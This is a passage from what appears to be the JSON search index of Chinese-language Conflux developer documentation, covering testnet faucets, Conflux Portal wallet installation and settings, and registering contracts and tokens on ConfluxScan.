\u518d\u6b21\u67e5\u770bPortal\uff0c\u53d1\u73b0\u5df2\u5b58\u5165100CFX Note \u200b \u6bcf\u4e2a\u5730\u5740\u4e00\u5c0f\u65f6\u5185\u53ea\u80fd\u9886\u53d6\u4e00\u6b21\u6d4b\u8bd5\u5e01\uff0c\u4e00\u5c0f\u65f6\u5185\u518d\u6b21\u70b9\u51fb\u201c\u83b7\u53d6CFX\u201d\u4f1a\u5f39\u51fa\u9886\u53d6\u5931\u8d25\u7684\u901a\u77e5\u3002 \u5c1d\u8bd5\u8f6c\u8d26cfx \u6dfb\u52a0CFX\u63a5\u6536\u65b9\uff08\u4e00\u822c\u590d\u5236\u4e00\u4e2a\u5730\u5740\uff09\uff1a \u70b9\u51fb\u786e\u8ba4\uff1a \u72b6\u6001\u4ece\u5f85\u5904\u7406\u53d8\u4e3a\u5df2\u6267\u884c \u53d1\u73b0\u8d26\u62372\u786e\u5b9e\u591a\u4e8610cfx","title":"Portal\u63a5\u53e3\u7533\u8bf7\u6d4b\u8bd5CFX\u57fa\u672c\u6b65\u9aa4"},{"location":"development/portal-faucet/#dapp","text":"Conflux\u5b98\u65b9\u4e3a\u6d4b\u8bd5\u7f51\u4e5f\u5b9e\u73b0\u4e86\u4e00\u6b3edapp\uff0c\u652f\u6301CFX\u3001FC\u548cCUSDT\u7684faucet\uff0cdapp \u94fe\u63a5 \u4f7f\u7528\u6d4b\u8bd5\u7f51\u7edc\u8bbf\u95ee\u4e0a\u8ff0\u94fe\u63a5\uff1a \u70b9\u51fb\u201c\u8fde\u63a5\u94b1\u5305\u201d\uff0c\u8fd9\u65f6Portal\u4f1a\u5f39\u51fa\uff1a \u70b9\u51fb\u540e\uff0cPortal\u7a97\u53e3\u6d88\u5931\u9875\u9762\u51fa\u73b0\u53d8\u5316\uff1a \u652f\u63013\u79cd\u4ee3\u5e01 \u9009\u62e9FansCoin \u70b9\u51fb\u9886\u53d6\u6309\u94ae \u70b9\u51fbPortal\u5185\u786e\u8ba4\u6309\u94ae\uff0c\u53d1\u8d77\u5408\u7ea6\u4ea4\u4e92 \u70b9\u51fb\u4ea4\u6613\u54c8\u5e0c\uff0c\u53ef\u53d1\u73b0\u5df2\u63a5\u6536100FC\uff1a Note \u200b \u63a5\u4e0b\u6765\u8fd8\u6709\u4e00\u6b65\uff0c\u9700\u8981\u8ba9\u6211\u4eec\u5728Portal\u4e2d\u6dfb\u52a0FC\u8fd9\u4e2a\u4ee3\u5e01\uff0c\u65b9\u6cd5\uff0c\u8bf7\u53c2\u8003 \u6cd5 2\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01 \uff0c\u800c\u5408\u7ea6\u5730\u5740\u5df2\u5728\u4e0b\u6587\u7ed9\u51fa\u3002","title":"\u8fdb\u9636\u65b9\u6cd5\uff1a\u76f4\u63a5\u4e0e\u5b98\u65b9\u63d0\u4f9b\u7684\u6d4b\u8bd5\u7f51dapp\u4ea4\u4e92"},{"location":"development/portal-faucet/#_2","text":"\u6d4b\u8bd5\u7f51FC\u5408\u7ea6Scan\u5730\u5740 \uff1acfxtest:achkx35n7vngfxgrm7akemk3ftzy47t61yk5nn270s \u6d4b\u8bd5\u7f51cUSDT\u5408\u7ea6Scan\u5730\u5740 \uff1acfxtest:acepe88unk7fvs18436178up33hb4zkuf62a9dk1gv","title":"\u6d4b\u8bd5\u7f51\u5408\u7ea6\u5730\u5740\u5217\u8868"},{"location":"development/portal-setting/","text":"Portal\u94b1\u5305\u5e38\u7528\u529f\u80fd\u89e3\u6790 \u00b6 \u7f51\u7edc\u5207\u6362 \u00b6 \u9ed8\u8ba4\u60c5\u51b5\u4e0bConflux Portal\u652f\u6301 Conflux Tethys\uff1a Tethys Scan\u94fe\u63a5 Conflux \u6d4b\u8bd5\u7f51\uff1a Testnet Scan\u94fe\u63a5 \u70b9\u51fb\u7bad\u5934 \u70b9\u51fb\u201cConflux \u6d4b\u8bd5\u7f51\u201d\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u524d\u7f00\u53d8\u4e3acfxtest \u8bbe\u7f6e\u94b1\u5305\u81ea\u52a8\u9501\u5b9a\u65f6\u95f4 \u00b6 \u4e3a\u907f\u514d\u7528\u6237\u56e0\u906d\u53d7 \u6728\u9a6c\u8fdc\u63a7 \u653b\u51fb\u800c\u94b1\u5305\u56e0\u672a\u9501\u5b9a\u5bf9\u8d44\u4ea7\u5e26\u6765\u7684\u6f5c\u5728\u5a01\u80c1\uff0cConflux Portal\u63d0\u4f9b\u4e86\u81ea\u52a8\u9501\u5b9a\u94b1\u5305\u7684\u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u8bbe\u7f6e\uff1a \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af->\u8bbe\u7f6e \u9009\u62e9\u201c\u9ad8\u7ea7\u201d \u62c9\u5230\u201c\u9ad8\u7ea7\u201d\u8bbe\u7f6e\u6700\u4e0b\u9762\uff0c\u81ea\u52a8\u6ce8\u9500\u8ba1\u65f6\u5668\u9ed8\u8ba4\u4e3a5\u5206\u949f\uff0c\u53ef\u81ea\u884c\u8c03\u6574\uff1a \u4fee\u6539\u4e3a3\u5206\u949f\uff0c\u4fdd\u5b58 Warning \u200b \u5c06\u81ea\u52a8\u6ce8\u9500\u8ba1\u65f6\u5668\u8bbe\u7f6e\u4e3a 0\u5206\u949f \uff0c\u5219ConfluxPortal\u5c06\u4e0d\u518d\u81ea\u52a8\u9501\u5b9a \u57fa\u4e8e\u521b\u5efa\u94b1\u5305\u65f6\u8bbe\u7f6e\u7684\u52a9\u8bb0\u8bcd\u6dfb\u52a0\u4e00\u4e2a\u65b0\u5b50\u8d26\u6237 \u00b6 \u8be5\u5b50\u8d26\u6237\u4ecd\u7136\u96b6\u5c5e\u4e8e\u52a9\u8bb0\u8bcd\uff0c\u4f60\u53ef\u4ee5\u628a\u4ed6\u7406\u89e3\u4e3a\u901a\u8fc7\u52a9\u8bb0\u8bcd\u6d3e\u751f\u7684\u53c8\u4e00\u4e2a\u8d26\u6237\uff0c\u5f53\u53bb\u5176\u4ed6\u673a\u5668\u4e0a\u4f7f\u7528\u52a9\u8bb0\u8bcd\u6062\u590d\u8d26\u6237\u540e\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7Portal\u4e2d\u7684\u201d\u6dfb\u52a0\u8d26\u6237\u201c\u64cd\u4f5c\uff0c\u6062\u590d\u51fa\u8fd9\u4e00\u5b50\u8d26\u6237 \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af\uff0c\u5e76\u5355\u51fb\u6dfb\u52a0\u8d26\u6237 Portal\u4e13\u95e8\u8fdb\u884c\u4e86\u5b89\u5168\u63d0\u793a\uff1a Warning \u200b \u8bf7\u6ce8\u610f\uff0c\u4e0d\u8981\u968f\u610f\u7684\u5206\u4eab\u8d26\u6237\u79c1\u94a5\u7ed9\u4ed6\u4eba\uff0c\u4f1a\u51fa\u73b0\u4e25\u91cd\u7684\u98ce\u9669\uff01 \u70b9\u51fb\u786e\u8ba4 \u5982\u679c\u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af\uff0c\u4f1a\u53d1\u73b0\u6211\u7684\u8d26\u6237\u5185\u989d\u5916\u51fa\u73b0\u4e86\u53e6\u4e00\u4e2a\u8d26\u62372 \u901a\u8fc7keystore\u6587\u4ef6\u5bfc\u5165\u8d26\u6237 \u00b6 \u4f7f\u7528\u8fc7Conflux\u7f51\u9875\u94b1\u5305\uff0c\u5176\u63d0\u4f9b\u4e86\u4e00\u79cd\u57fa\u4e8ekeystore\u6587\u4ef6\u767b\u9646Conflux\u94b1\u5305\u7684\u65b9\u6cd5\uff0cConflux Portal\u540c\u6837\u652f\u6301\u5c06keystore\u6587\u4ef6\u5bfc\u5165Portal\u7684\u65b9\u6cd5\u6062\u590d\u5bf9\u5e94\u7684\u8d26\u6237\uff0c\u64cd\u4f5c\u6d41\u7a0b\u5982\u4e0b\uff1a \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af->\u5bfc\u5165\u8d26\u6237 \u9009\u62e9JSON\u6587\u4ef6\u5bfc\u5165\uff1a \u70b9\u51fb\u6d4f\u89c8\uff0c\u5728\u5f39\u51fa\u7a97\u53e3\u9009\u62e9\u9700\u8981\u5bfc\u5165\u7684keystore\u6587\u4ef6 \u9009\u62e9\u597d\u6587\u4ef6\u540e\uff0c\u8f93\u5165\u5728\u521b\u5efa\u7f51\u9875\u94b1\u5305\u65f6\u8bbe\u7f6e\u7684\u94b1\u5305\u767b\u9646\u5bc6\u7801 \u70b9\u51fb\u5bfc\u5165\uff0c\u5bfc\u5165\u6210\u529f","title":"Portal\u94b1\u5305\u5e38\u7528\u529f\u80fd\u89e3\u6790"},{"location":"development/portal-setting/#portal","text":"","title":"Portal\u94b1\u5305\u5e38\u7528\u529f\u80fd\u89e3\u6790"},{"location":"development/portal-setting/#_1","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0bConflux Portal\u652f\u6301 Conflux Tethys\uff1a Tethys Scan\u94fe\u63a5 Conflux \u6d4b\u8bd5\u7f51\uff1a Testnet Scan\u94fe\u63a5 \u70b9\u51fb\u7bad\u5934 \u70b9\u51fb\u201cConflux \u6d4b\u8bd5\u7f51\u201d\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u524d\u7f00\u53d8\u4e3acfxtest","title":"\u7f51\u7edc\u5207\u6362"},{"location":"development/portal-setting/#_2","text":"\u4e3a\u907f\u514d\u7528\u6237\u56e0\u906d\u53d7 \u6728\u9a6c\u8fdc\u63a7 \u653b\u51fb\u800c\u94b1\u5305\u56e0\u672a\u9501\u5b9a\u5bf9\u8d44\u4ea7\u5e26\u6765\u7684\u6f5c\u5728\u5a01\u80c1\uff0cConflux Portal\u63d0\u4f9b\u4e86\u81ea\u52a8\u9501\u5b9a\u94b1\u5305\u7684\u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u8bbe\u7f6e\uff1a \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af->\u8bbe\u7f6e \u9009\u62e9\u201c\u9ad8\u7ea7\u201d \u62c9\u5230\u201c\u9ad8\u7ea7\u201d\u8bbe\u7f6e\u6700\u4e0b\u9762\uff0c\u81ea\u52a8\u6ce8\u9500\u8ba1\u65f6\u5668\u9ed8\u8ba4\u4e3a5\u5206\u949f\uff0c\u53ef\u81ea\u884c\u8c03\u6574\uff1a \u4fee\u6539\u4e3a3\u5206\u949f\uff0c\u4fdd\u5b58 Warning \u200b \u5c06\u81ea\u52a8\u6ce8\u9500\u8ba1\u65f6\u5668\u8bbe\u7f6e\u4e3a 0\u5206\u949f \uff0c\u5219ConfluxPortal\u5c06\u4e0d\u518d\u81ea\u52a8\u9501\u5b9a","title":"\u8bbe\u7f6e\u94b1\u5305\u81ea\u52a8\u9501\u5b9a\u65f6\u95f4"},{"location":"development/portal-setting/#_3","text":"\u8be5\u5b50\u8d26\u6237\u4ecd\u7136\u96b6\u5c5e\u4e8e\u52a9\u8bb0\u8bcd\uff0c\u4f60\u53ef\u4ee5\u628a\u4ed6\u7406\u89e3\u4e3a\u901a\u8fc7\u52a9\u8bb0\u8bcd\u6d3e\u751f\u7684\u53c8\u4e00\u4e2a\u8d26\u6237\uff0c\u5f53\u53bb\u5176\u4ed6\u673a\u5668\u4e0a\u4f7f\u7528\u52a9\u8bb0\u8bcd\u6062\u590d\u8d26\u6237\u540e\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7Portal\u4e2d\u7684\u201d\u6dfb\u52a0\u8d26\u6237\u201c\u64cd\u4f5c\uff0c\u6062\u590d\u51fa\u8fd9\u4e00\u5b50\u8d26\u6237 \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af\uff0c\u5e76\u5355\u51fb\u6dfb\u52a0\u8d26\u6237 Portal\u4e13\u95e8\u8fdb\u884c\u4e86\u5b89\u5168\u63d0\u793a\uff1a Warning \u200b \u8bf7\u6ce8\u610f\uff0c\u4e0d\u8981\u968f\u610f\u7684\u5206\u4eab\u8d26\u6237\u79c1\u94a5\u7ed9\u4ed6\u4eba\uff0c\u4f1a\u51fa\u73b0\u4e25\u91cd\u7684\u98ce\u9669\uff01 \u70b9\u51fb\u786e\u8ba4 \u5982\u679c\u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af\uff0c\u4f1a\u53d1\u73b0\u6211\u7684\u8d26\u6237\u5185\u989d\u5916\u51fa\u73b0\u4e86\u53e6\u4e00\u4e2a\u8d26\u62372","title":"\u57fa\u4e8e\u521b\u5efa\u94b1\u5305\u65f6\u8bbe\u7f6e\u7684\u52a9\u8bb0\u8bcd\u6dfb\u52a0\u4e00\u4e2a\u65b0\u5b50\u8d26\u6237"},{"location":"development/portal-setting/#keystore","text":"\u4f7f\u7528\u8fc7Conflux\u7f51\u9875\u94b1\u5305\uff0c\u5176\u63d0\u4f9b\u4e86\u4e00\u79cd\u57fa\u4e8ekeystore\u6587\u4ef6\u767b\u9646Conflux\u94b1\u5305\u7684\u65b9\u6cd5\uff0cConflux Portal\u540c\u6837\u652f\u6301\u5c06keystore\u6587\u4ef6\u5bfc\u5165Portal\u7684\u65b9\u6cd5\u6062\u590d\u5bf9\u5e94\u7684\u8d26\u6237\uff0c\u64cd\u4f5c\u6d41\u7a0b\u5982\u4e0b\uff1a \u70b9\u51fb\u53f3\u4e0a\u89d2\u5706\u73af->\u5bfc\u5165\u8d26\u6237 \u9009\u62e9JSON\u6587\u4ef6\u5bfc\u5165\uff1a \u70b9\u51fb\u6d4f\u89c8\uff0c\u5728\u5f39\u51fa\u7a97\u53e3\u9009\u62e9\u9700\u8981\u5bfc\u5165\u7684keystore\u6587\u4ef6 \u9009\u62e9\u597d\u6587\u4ef6\u540e\uff0c\u8f93\u5165\u5728\u521b\u5efa\u7f51\u9875\u94b1\u5305\u65f6\u8bbe\u7f6e\u7684\u94b1\u5305\u767b\u9646\u5bc6\u7801 \u70b9\u51fb\u5bfc\u5165\uff0c\u5bfc\u5165\u6210\u529f","title":"\u901a\u8fc7keystore\u6587\u4ef6\u5bfc\u5165\u8d26\u6237"},{"location":"development/portal/","text":"Portal\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u00b6 \u8003\u8651\u5230\u90e8\u5206\u540c\u5fd7FQ\u96be\u7684\u95ee\u9898\uff0c\u7279\u4f7f\u7528\u706b\u72d0\u6d4f\u89c8\u5668\u7ed9\u5404\u4f4d\u89c2\u4f17\u8001\u7237\u4eec\u8fdb\u884c\u5c55\u793a \u4e0b\u8f7d\u706b\u72d0\u6d4f\u89c8\u5668 \u00b6 \u8bbf\u95ee Firefox\u5b98\u7f51 \uff1a\u70b9\u51fb\u201c\u7acb\u5373\u4e0b\u8f7d\u6309\u94ae\u201d \u5b89\u88c5Portal \u00b6 \u641c\u7d22\u201cconflux\u201d\u5173\u952e\u5b57 \u70b9\u51fb\u201cConflux Portal\u201d \u70b9\u51fb\u201c\u6dfb\u52a0\u5230Firefox\u201d \u70b9\u51fb\u201c\u6dfb\u52a0\u201d\u6309\u94ae \u5b89\u88c5\u5b8c\u6210 \u70b9\u51fb\u5f00\u59cb\u4f7f\u7528 \u540c\u610f \u8bbe\u7f6e\u201c\u89e3\u9501\u5bc6\u7801\u201d \u52fe\u9009\u540c\u610f Warning \u8fd9\u91cc\u5c24\u5176\u8981\u6ce8\u610f\u4fdd\u5b58\u597d\u5bc6\u8bed\uff08 \u52a9\u8bb0\u8bcd \uff09\uff0c\u4e0d\u8981\u8ba9\u522b\u4eba\u770b\u5230 \u5907\u4efd\u5bc6\u8bed \u70b9\u51fb\u6b64\u5904\u663e\u793a\u6697\u8bed\uff0c\u8bb0\u5f55\uff0c\u5e76\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u6309\u5e8f\u9009\u62e9\u52a9\u8bb0\u8bcd\uff0c\u70b9\u786e\u8ba4 \u70b9\u51fb\u5168\u90e8\u5b8c\u6210 \u8fd9\u662f\u53ef\u901a\u8fc7\u6d4f\u89c8\u5668\u4fa7\u8fb9\u680f\u8bbf\u95eePortal \u8f93\u5165\u5bc6\u7801\uff0c\u89e3\u9501","title":"Portal\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4"},{"location":"development/portal/#portal","text":"\u8003\u8651\u5230\u90e8\u5206\u540c\u5fd7FQ\u96be\u7684\u95ee\u9898\uff0c\u7279\u4f7f\u7528\u706b\u72d0\u6d4f\u89c8\u5668\u7ed9\u5404\u4f4d\u89c2\u4f17\u8001\u7237\u4eec\u8fdb\u884c\u5c55\u793a","title":"Portal\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4"},{"location":"development/portal/#_1","text":"\u8bbf\u95ee Firefox\u5b98\u7f51 \uff1a\u70b9\u51fb\u201c\u7acb\u5373\u4e0b\u8f7d\u6309\u94ae\u201d","title":"\u4e0b\u8f7d\u706b\u72d0\u6d4f\u89c8\u5668"},{"location":"development/portal/#portal_1","text":"\u641c\u7d22\u201cconflux\u201d\u5173\u952e\u5b57 \u70b9\u51fb\u201cConflux Portal\u201d \u70b9\u51fb\u201c\u6dfb\u52a0\u5230Firefox\u201d \u70b9\u51fb\u201c\u6dfb\u52a0\u201d\u6309\u94ae \u5b89\u88c5\u5b8c\u6210 \u70b9\u51fb\u5f00\u59cb\u4f7f\u7528 \u540c\u610f \u8bbe\u7f6e\u201c\u89e3\u9501\u5bc6\u7801\u201d \u52fe\u9009\u540c\u610f Warning \u8fd9\u91cc\u5c24\u5176\u8981\u6ce8\u610f\u4fdd\u5b58\u597d\u5bc6\u8bed\uff08 \u52a9\u8bb0\u8bcd \uff09\uff0c\u4e0d\u8981\u8ba9\u522b\u4eba\u770b\u5230 \u5907\u4efd\u5bc6\u8bed \u70b9\u51fb\u6b64\u5904\u663e\u793a\u6697\u8bed\uff0c\u8bb0\u5f55\uff0c\u5e76\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u6309\u5e8f\u9009\u62e9\u52a9\u8bb0\u8bcd\uff0c\u70b9\u786e\u8ba4 \u70b9\u51fb\u5168\u90e8\u5b8c\u6210 \u8fd9\u662f\u53ef\u901a\u8fc7\u6d4f\u89c8\u5668\u4fa7\u8fb9\u680f\u8bbf\u95eePortal \u8f93\u5165\u5bc6\u7801\uff0c\u89e3\u9501","title":"\u5b89\u88c5Portal"},{"location":"development/register-contract-and-token-display/","text":"\u5982\u4f55\u5728Scan\u4e0a\u6ce8\u518c\u5408\u7ea6\u548c\u4ee3\u5e01\u5c55\u793a \u00b6 \u90e8\u7f72\u5408\u7ea6 \u00b6 \u5728Scan\u4e0a\u5c06\u5408\u7ea6\u5c55\u793a\u4e0a\u94fe\uff0c\u7b2c\u4e00\u6b65\u662f\u5c06\u5408\u7ea6\u90e8\u7f72\u5230Conflux\u3002 \u6253\u5f00Scan\u7684 \u5408\u7ea6\u90e8\u7f72\u754c\u9762 \u8fde\u63a5 Conflux Portal \u94b1\u5305 \u5c06 ConfluxStudio \uff0c cfxtruffle \uff0c remix \u7f16\u8bd1\u540e\u7684 .json \u6587\u4ef6\u5bfc\u5165\uff08import JSON file\uff09\uff0c\u6216\u624b\u52a8\u62f7\u8d1d bytecode \uff08\u5fc5\u586b\uff09\u548c ABI \uff08\u9009\u586b\uff09\u3002 Note \u200b \u6ce8\uff1abytecode\u4e3a\u5fc5\u586b\u9879\uff0cABI\u9009\u586b\u3002 \u8bf7\u6ce8\u610f\u4e0b\u65b9\u7684\u63d0\u793a\uff1a \u5408\u540c\u90e8\u7f72\u5373\u901a\u8fc7\u53d1\u9001\u4ea4\u6613\u5411 Conflux \u7f51\u7edc\u53d1\u5e03\u5408\u7ea6\u4ee3\u7801\u3002\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u7684\u5e10\u6237\u4e2d CFX \u4f59\u989d\u5145\u8db3\u3002 \u4ec5\u652f\u6301 ConfluxStudio\uff0ccfxtruffle \uff0cremix \u7f16\u8bd1\u540e\u7684 .json \u6587\u4ef6\u5bfc\u5165\uff1b\u540c\u65f6\u652f\u6301\u624b\u52a8\u62f7\u8d1d bytecode \uff08\u5fc5\u586b\uff09\u548c ABI \uff08\u9009\u586b\uff09\u3002 \u6682\u4e0d\u652f\u6301\u8f93\u5165\u6784\u9020\u51fd\u6570\u53c2\u6570\u3002 \u60a8\u53ef\u4ee5\u70b9\u51fb\u9875\u9762\u53f3\u4e0a\u89d2\u7684\u8d26\u6237\uff0c\u5728\u60a8\u7684\u8d26\u6237\u4ea4\u6613\u5386\u53f2\u4e2d\u67e5\u770b\u5408\u7ea6\u90e8\u7f72\u8be6\u60c5\u3002 \u70b9\u51fb\u63d0\u4ea4\uff0c\u5e76\u7b7e\u540d\u4ea4\u6613\u3002 \u5728ConfluxScan\u7684\u4ea4\u6613\u4fe1\u606f\u4e2d\uff0c\u63a5\u6536\u65b9\u5730\u5740\u5373\u4e3a\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740\u3002 \u5408\u7ea6\u6ce8\u518c \u00b6 \u90e8\u7f72\u5b8c\u5408\u7ea6\u4e4b\u540e\uff0c\u6b64\u65f6\u7684Scan\u4e0a\u4ecd\u65e7\u65e0\u6cd5\u67e5\u770b\u8be5\u5408\u7ea6\uff0c\u9700\u8981\u6ce8\u518c\u5408\u7ea6\u624d\u80fd\u5c06\u5408\u7ea6\u7684\u540d\u5b57\u5c55\u793a\u5728Scan\u4e0a\u3002 \u70b9\u51fb\u94fe\u63a5\u6253\u5f00 \u5408\u7ea6\u6ce8\u518c \u754c\u9762 \u5728\u5408\u7ea6\u6ce8\u518c\u7684\u4fe1\u606f\u680f\u586b\u5199\u5408\u7ea6\u5730\u5740\u548c\u5408\u7ea6\u59d3\u540d\u3002 \u5408\u7ea6\u59d3\u540d\u5e94\u5f53\u548c\u90e8\u7f72\u5408\u7ea6\u65f6\u5199\u5728\u5408\u7ea6\u91cc\u7684\u4e00\u81f4\uff1b\u5408\u7ea6\u5730\u5740\u5e94\u5f53\u4e3aConflux\u5730\u5740\u3002 \u53f3\u4fa7\u4e0a\u4f20\u7a97\u53e3\u652f\u6301\u5408\u7ea6\u56fe\u6807\u7684\u4e0a\u4f20\u548c\u4ee3\u5e01\u56fe\u6807\u7684\u4e0a\u4f20\u3002 Note \u200b \u6ce8\uff1a\u975eCRC20\u7684\u5408\u7ea6\u4e0d\u53ef\u4ee5\u4e0a\u4f20\u4ee3\u5e01\u56fe\u6807 \u53ea\u6709\u5408\u7ea6\u7684\u62e5\u6709\u8005\u548c\u7ba1\u7406\u8005\u53ef\u4ee5\u4e0a\u4f20\u56fe\u6807\uff0c\u5176\u4ed6\u4eba\u4e0a\u4f20\u56fe\u6807\u4f1a\u5f39\u51fa\u63d0\u793a\u3002 \u4ee3\u5e01\u5c55\u793a \u00b6 \u9879\u76ee\u65b9\u5982\u679c\u60f3\u5728Scan\u4e0a\u5c55\u793a\u4ee3\u5e01\uff0c\u9700\u8981\u8054\u7cfb\u5de5\u4f5c\u4eba\u5458\uff08 cike@confluxnetwork.org \uff09\u7533\u8bf7\u5ba1\u6838\u3002 \u4f46\u76ee\u524d\u7684scan\u5df2\u4e0d\u9700\u8981\u5ba1\u6838\u5373\u53ef\u5c55\u793a\u4ee3\u5e01\u76f8\u5173\u4fe1\u606f\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u8981\u6309\u7167CRC20\u6807\u51c6\u5f00\u53d1\u5e76\u90e8\u7f72\u4ee3\u5e01\u5408\u7ea6\u5373\u53ef\u83b7\u5f97\u5c55\u793a\u3002","title":"\u5982\u4f55\u5728Scan\u4e0a\u6ce8\u518c\u5408\u7ea6\u548c\u4ee3\u5e01\u5c55\u793a"},{"location":"development/register-contract-and-token-display/#scan","text":"","title":"\u5982\u4f55\u5728Scan\u4e0a\u6ce8\u518c\u5408\u7ea6\u548c\u4ee3\u5e01\u5c55\u793a"},{"location":"development/register-contract-and-token-display/#_1","text":"\u5728Scan\u4e0a\u5c06\u5408\u7ea6\u5c55\u793a\u4e0a\u94fe\uff0c\u7b2c\u4e00\u6b65\u662f\u5c06\u5408\u7ea6\u90e8\u7f72\u5230Conflux\u3002 \u6253\u5f00Scan\u7684 \u5408\u7ea6\u90e8\u7f72\u754c\u9762 \u8fde\u63a5 Conflux Portal \u94b1\u5305 \u5c06 ConfluxStudio \uff0c cfxtruffle \uff0c remix \u7f16\u8bd1\u540e\u7684 .json \u6587\u4ef6\u5bfc\u5165\uff08import JSON file\uff09\uff0c\u6216\u624b\u52a8\u62f7\u8d1d bytecode \uff08\u5fc5\u586b\uff09\u548c ABI \uff08\u9009\u586b\uff09\u3002 Note \u200b \u6ce8\uff1abytecode\u4e3a\u5fc5\u586b\u9879\uff0cABI\u9009\u586b\u3002 \u8bf7\u6ce8\u610f\u4e0b\u65b9\u7684\u63d0\u793a\uff1a \u5408\u540c\u90e8\u7f72\u5373\u901a\u8fc7\u53d1\u9001\u4ea4\u6613\u5411 Conflux \u7f51\u7edc\u53d1\u5e03\u5408\u7ea6\u4ee3\u7801\u3002\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u7684\u5e10\u6237\u4e2d CFX \u4f59\u989d\u5145\u8db3\u3002 \u4ec5\u652f\u6301 ConfluxStudio\uff0ccfxtruffle \uff0cremix \u7f16\u8bd1\u540e\u7684 .json \u6587\u4ef6\u5bfc\u5165\uff1b\u540c\u65f6\u652f\u6301\u624b\u52a8\u62f7\u8d1d bytecode \uff08\u5fc5\u586b\uff09\u548c ABI \uff08\u9009\u586b\uff09\u3002 \u6682\u4e0d\u652f\u6301\u8f93\u5165\u6784\u9020\u51fd\u6570\u53c2\u6570\u3002 \u60a8\u53ef\u4ee5\u70b9\u51fb\u9875\u9762\u53f3\u4e0a\u89d2\u7684\u8d26\u6237\uff0c\u5728\u60a8\u7684\u8d26\u6237\u4ea4\u6613\u5386\u53f2\u4e2d\u67e5\u770b\u5408\u7ea6\u90e8\u7f72\u8be6\u60c5\u3002 \u70b9\u51fb\u63d0\u4ea4\uff0c\u5e76\u7b7e\u540d\u4ea4\u6613\u3002 \u5728ConfluxScan\u7684\u4ea4\u6613\u4fe1\u606f\u4e2d\uff0c\u63a5\u6536\u65b9\u5730\u5740\u5373\u4e3a\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740\u3002","title":"\u90e8\u7f72\u5408\u7ea6"},{"location":"development/register-contract-and-token-display/#_2","text":"\u90e8\u7f72\u5b8c\u5408\u7ea6\u4e4b\u540e\uff0c\u6b64\u65f6\u7684Scan\u4e0a\u4ecd\u65e7\u65e0\u6cd5\u67e5\u770b\u8be5\u5408\u7ea6\uff0c\u9700\u8981\u6ce8\u518c\u5408\u7ea6\u624d\u80fd\u5c06\u5408\u7ea6\u7684\u540d\u5b57\u5c55\u793a\u5728Scan\u4e0a\u3002 \u70b9\u51fb\u94fe\u63a5\u6253\u5f00 \u5408\u7ea6\u6ce8\u518c \u754c\u9762 \u5728\u5408\u7ea6\u6ce8\u518c\u7684\u4fe1\u606f\u680f\u586b\u5199\u5408\u7ea6\u5730\u5740\u548c\u5408\u7ea6\u59d3\u540d\u3002 \u5408\u7ea6\u59d3\u540d\u5e94\u5f53\u548c\u90e8\u7f72\u5408\u7ea6\u65f6\u5199\u5728\u5408\u7ea6\u91cc\u7684\u4e00\u81f4\uff1b\u5408\u7ea6\u5730\u5740\u5e94\u5f53\u4e3aConflux\u5730\u5740\u3002 \u53f3\u4fa7\u4e0a\u4f20\u7a97\u53e3\u652f\u6301\u5408\u7ea6\u56fe\u6807\u7684\u4e0a\u4f20\u548c\u4ee3\u5e01\u56fe\u6807\u7684\u4e0a\u4f20\u3002 Note \u200b \u6ce8\uff1a\u975eCRC20\u7684\u5408\u7ea6\u4e0d\u53ef\u4ee5\u4e0a\u4f20\u4ee3\u5e01\u56fe\u6807 \u53ea\u6709\u5408\u7ea6\u7684\u62e5\u6709\u8005\u548c\u7ba1\u7406\u8005\u53ef\u4ee5\u4e0a\u4f20\u56fe\u6807\uff0c\u5176\u4ed6\u4eba\u4e0a\u4f20\u56fe\u6807\u4f1a\u5f39\u51fa\u63d0\u793a\u3002","title":"\u5408\u7ea6\u6ce8\u518c"},{"location":"development/register-contract-and-token-display/#_3","text":"\u9879\u76ee\u65b9\u5982\u679c\u60f3\u5728Scan\u4e0a\u5c55\u793a\u4ee3\u5e01\uff0c\u9700\u8981\u8054\u7cfb\u5de5\u4f5c\u4eba\u5458\uff08 cike@confluxnetwork.org \uff09\u7533\u8bf7\u5ba1\u6838\u3002 \u4f46\u76ee\u524d\u7684scan\u5df2\u4e0d\u9700\u8981\u5ba1\u6838\u5373\u53ef\u5c55\u793a\u4ee3\u5e01\u76f8\u5173\u4fe1\u606f\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u8981\u6309\u7167CRC20\u6807\u51c6\u5f00\u53d1\u5e76\u90e8\u7f72\u4ee3\u5e01\u5408\u7ea6\u5373\u53ef\u83b7\u5f97\u5c55\u793a\u3002","title":"\u4ee3\u5e01\u5c55\u793a"},{"location":"development/resources/","text":"\u5f00\u53d1\u8d44\u6e90 \u00b6 \u5e38\u7528 \u00b6 Conflux\u5bf9\u63a5Q&A Conflux-faqs\u5408\u96c6 Conflux\u516c\u4f17\u53f7\u6280\u672f\u6587\u7ae0&\u6559\u7a0b&\u89c6\u9891&\u6f2b\u753b\u76ee\u5f55 Conflux 